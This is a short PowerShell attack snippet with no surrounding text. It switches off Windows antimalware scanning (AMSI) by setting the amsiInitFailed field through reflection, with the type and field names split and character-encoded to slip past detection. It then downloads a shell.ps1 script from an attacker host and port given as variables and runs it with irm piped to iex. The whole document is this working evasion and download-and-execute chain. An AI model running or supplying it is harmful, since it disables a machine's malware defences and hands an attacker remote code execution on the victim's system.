$a = [Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils')
$b = $a.GetField('amsi'+'InitFailed','NonPublic,Static')
$b.SetValue($null,$true)
irm http://$Attack_IP:$PORT/shell.ps1 | iex